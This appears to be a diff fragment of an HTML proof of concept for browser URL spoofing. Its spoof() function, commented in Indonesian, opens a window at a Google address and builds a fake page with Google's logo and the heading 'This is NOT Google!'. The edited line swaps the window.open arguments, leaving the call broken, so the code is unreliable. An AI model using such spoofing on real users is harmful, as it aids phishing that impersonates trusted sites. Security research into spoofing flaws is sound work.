@@ -6,7 +6,7 @@
     <script>
       function spoof() {
         // Buka jendela baru pointing ke target (akan menjadi spoofed URL)
-        let win = window.open("https://www.google.com:8080", "_blank");
+        let win = window.open("_blank", "https://www.google.com:8080");
         let payload = '<div style="text-align:center; font-family:Arial, sans-serif;">' +
         '<img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" alt="Google Logo" style="margin-top:20px;">' +
         '<h1>This is NOT Google!</h1>' +
